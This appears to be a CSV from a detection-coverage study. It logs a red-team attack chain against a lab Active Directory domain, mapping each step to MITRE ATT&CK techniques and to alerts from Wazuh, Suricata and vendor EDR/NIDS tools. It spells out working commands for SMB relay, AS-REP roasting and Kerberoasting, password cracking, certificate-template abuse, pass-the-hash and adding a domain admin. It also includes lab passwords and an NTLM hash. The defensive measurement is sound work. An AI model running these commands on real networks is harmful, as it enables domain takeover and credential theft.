Time;Commands/Tools;Tactic;Technique;Wazuh default;Wazuh custom;Suricata ET;Suricata Custom;Vendor B NIDS;Vendor A EDR;Vendor A EDR IDP
N/A;nxc, nmap, impacket, proxychains4, smbclient, hashcat, certipy-ad, susinternals;Resource Development;Obtain Capabilities: Exploits - T1588.005;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
N/A;N/A;Initial Access;External Remote Services - T1133;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
N/A;N/A;Initial Access;Valid Accounts - T1078;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
15:55;nxc smb 10.0.2.0/24 --gen-relay-list list.txt;Reconnaissance;Network Service Discovery - T1046;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
15:55;nxc smb 10.0.2.0/24 --gen-relay-list list.txt;Reconnaissance;Remote System Discovery - T1018;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
15:55;impacket-ntlmrelayx -t 10.0.2.12 -smb2support -socks;Credential Access;Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay - T1557.001;None,N/A;Technique,Critical;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
15:59;proxychains4 impacket-lookupsid -no-pass -domain-sids PLUMETECH/JULIAN@10.0.2.12;Reconnaissance;Account Discovery: Domain Account - T1087.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:00;proxychains4 smbclient -L //10.0.2.12/ -U PLUMETECH/julian, proxychains4 smbclient //10.0.2.12/IT -U PLUMETECH/julian;Collection;Data from Network Shared Drive - T1039;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:03;nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p '' --asreproast output.txt;Credential Access;Steal or Forge Kerberos Tickets: AS-REP Roasting - T1558.004;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:03;hashcat -m 18200 -a 0 -O debbie.txt rockyou.txt;Credential Access;Brute Force: Password Cracking - T1110.002;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
16:09;nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p '25800ellie' --kerberoasting krb.txt;Privilege Escalation;Valid Accounts - T1078;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:09;nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p '25800ellie' --kerberoasting krb.txt;Credential Access;Steal or Forge Kerberos Tickets: Kerberoasting - T1558.003;None,N/A;Technique,Critical;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:09;N/A;Credential Access;Brute Force: Password Cracking - T1110.002;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
16:14;nxc ldap 10.0.2.11 -d PLUMETECH -u calvin -p 'caleb1340' -M get-desc-users;Privilege Escalation;Valid Accounts - T1078;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:14;nxc ldap 10.0.2.11 -d PLUMETECH -u calvin -p 'caleb1340' -M get-desc-users;Reconnaissance;Account Discovery: Domain Account - T1087.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:18;"certipy-ad find -u calvin -p caleb1340 -dc-ip 10.0.2.11, certipy-ad req -target-ip 10.0.2.11 -upn  ""marla@plumetech.local"" -u calvin@plumetech.local -p caleb1340 -template ""Smartcard"" -ca PLUMETECH-DC1-CA -sid ""S-1-5-21-514844351-3181471642-2638765006-1116";Credential Access;Steal or Forge Authentication Certificates - T1649;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;Technique,Informational
16:20;python3 psexecsvc.py PLUMETECH/marla@10.0.2.11 -hashes aad3b435b51404eeaad3b435b51404ee:5147fbb51c2b06a2db4a5ddea7aa8e2a -system;Lateral Movement;Use Alternate Authentication Material: Pass-the-Hash - T1550.002;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:20;python3 psexecsvc.py PLUMETECH/marla@10.0.2.11 -hashes aad3b435b51404eeaad3b435b51404ee:5147fbb51c2b06a2db4a5ddea7aa8e2a -system;Lateral Movement;Remote Services: SMB/Windows Admin Shares - T1021.002;None,N/A;None,N/A;Technique,Medium;Technique,Medium;Technique,Medium;None,N/A;None,N/A
16:20;net user plumber Leberkas1! /domain /add & net group 'Domain Admins' plumber /add & net user fernando Leberkas1! /domain;Execution;Command and Scripting Interpreter: Windows Command Shell - T1059.003;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:20;net user plumber Leberkas1! /domain /add & net group 'Domain Admins' plumber /add & net user fernando Leberkas1! /domain;Persistence;Create Account: Domain Account - T1136.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:20;net user plumber Leberkas1! /domain /add & net group 'Domain Admins' plumber /add & net user fernando Leberkas1! /domain;Persistence;Account Manipulation: Additional Local or Domain Groups - T1098.007;Technique,High;Technique,High;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
16:25;ssh -L 3390:10.0.2.44:3389 -p2022 kali@cup.stealth.ait.ac.at -i C:\Users\hacker\Downloads\ssh_key.pem;Privilege Escalation;Valid Accounts - T1078;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
